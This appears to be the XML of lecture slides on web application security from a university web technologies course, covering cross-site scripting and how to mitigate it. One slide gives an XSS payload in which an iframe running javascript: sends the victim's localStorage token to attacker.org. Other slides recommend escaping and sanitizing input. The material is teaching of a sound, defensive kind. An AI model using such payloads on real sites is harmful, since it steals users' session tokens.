              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5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dirty="0" spc="-25"/>
              <a:t>10</a:t>
            </a:fld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40"/>
              <a:t>XSS:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>LEAKING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-55"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="120"/>
              <a:t>A</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-110"/>
              <a:t>PRIVATE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>TOKEN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962050" y="1533220"/>
            <a:ext cx="10856595" cy="397573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240029" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3195"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="95"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Accessing</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-1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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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API</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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55">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Token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or</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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session</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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fun,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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but</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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an</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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attacker</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="241300">
              <a:lnSpc>
                <a:spcPts val="3195"/>
              </a:lnSpc>
            </a:pP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can’t</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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much</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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without</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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getting</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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it</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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out</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>victim’s</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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browser</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="675"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Several</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10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ways</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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that:</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="229"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Redirect</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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window</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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(or</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-2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an</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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iframe)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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 spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>URL</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" marR="878205" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="2590"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="545"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="697865" algn="l"/>
              </a:tabLst>
            </a:pP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Add</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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an</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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image</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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whose</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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source</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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URL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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(blocked</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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by</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-3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some</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>modern 	browsers)</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="180"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Load</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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stylesheet</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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whose</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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href</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-4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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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malicious</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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 spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>URL</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="2735"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="725"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;iframe</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-180">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"javascript:window.location.href</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-140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dirty="0" sz="2400" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="241300">
              <a:lnSpc>
                <a:spcPts val="2590"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>`https://attacker.org?token=${localStorage.getItem('token')}`"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="241300">
              <a:lnSpc>
                <a:spcPts val="2735"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/iframe&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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45"/>
              <a:t>MITIGATING</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-204"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-180"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-120"/>
              <a:t>VULNERABILITIES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962050" y="1446872"/>
            <a:ext cx="10043795" cy="2616835"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="98425" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="775"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Do</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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not</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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rely</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>only</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-60" b="1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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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filtering</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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approaches</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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unless</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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absolutely</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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necessary</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1060"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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best</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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way</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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address</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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problem</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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properly</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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escape</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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(sanitize)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	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inputs</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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when</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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inserting</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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them</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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into</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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pages</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="195"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pP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Convert</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>dangerous</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-60" b="1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 spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>characters</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-65" b="1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(e.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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&lt;,&gt;,",',...)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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 b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>harmless</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-60" b="1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 spc="-10" b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>HTMLEntities</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Dedicated</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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solutions</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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exist</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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in</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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most</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>frameworks/programming</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-9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 spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>languages</a:t>
            </a:r>
            <a:endParaRPr sz="2400">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="696595" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="215"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="696595" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Dedicated</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-6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libraries</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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can</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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used,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-5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e.g.:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-7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u="sng" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>sanitize</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400" spc="-65">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Node.js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579119" y="4623815"/>
            <a:ext cx="3823970" cy="368935"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="32384" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="91440">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="254"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"XSS"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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4960620" y="4623815"/>
            <a:ext cx="6652259" cy="368935"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="32384" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="91440">
              <a:lnSpc>
                <a:spcPct val="100000"/>
